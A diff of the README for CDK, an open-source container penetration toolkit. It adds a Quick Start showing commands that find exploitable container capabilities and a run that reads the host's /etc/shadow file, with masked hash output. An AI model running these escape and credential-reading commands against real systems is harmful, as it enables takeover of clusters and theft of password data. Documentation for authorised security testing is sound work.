@@ -3,7 +3,7 @@
 
 English | [简体中文](https://github.com/cdk-team/CDK/wiki/CDK-Home-CN)
 
-![png](https://static.cdxy.me/20201203170308_NwzGiT_Screenshot.jpeg)
+![png](https://user-images.githubusercontent.com/7868679/177925206-8d83dc95-0f2f-4d61-9a45-0d43b1b0468f.png)
 
 ## Legal Disclaimer
 
@@ -13,6 +13,28 @@ CDK is for security testing purposes only.
 ## Overview
 
 CDK is an open-sourced container penetration toolkit, designed for offering stable exploitation in different slimmed containers without any OS dependency. It comes with useful net-tools and many powerful PoCs/EXPs and helps you to escape container and take over K8s cluster easily.
+
+## Quick Start
+
+Run **`cdk eva`** to get evaluate info and a recommend exploit, then run **`cdk run`** to start the attack.
+
+```
+> ./cdk eva --full
+
+[*] Maybe you can exploit the *Capabilities* below:
+[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
+[!] CAP_SYS_MODULE enabled. You can escape the container via loading kernel module. More info at https://xcellerator.github.io/posts/docker_escape/.
+Critical - SYS_ADMIN Capability Found. Try 'cdk run rewrite-cgroup-devices/mount-cgroup/...'.
+Critical - Possible Privileged Container Found.
+
+> ./cdk run cap-dac-read-search
+
+Running with target: /etc/shadow, ref: /etc/hostname
+ubuntu:$6$*******:19173:0:99999:7:::
+root:*:18659:0:99999:7:::
+daemon:*:18659:0:99999:7:::
+bin:*:18659:0:99999:7:::
+```
 
 ## Installation/Delivery
 
@@ -43,7 +65,6 @@ chmod a+x cdk
 Usage:
   cdk evaluate [--full]
   cdk run (--list | <exploit> [<args>...])
-  cdk auto-escape <cmd>
   cdk <tool> [<args>...]
 
 Evaluate:
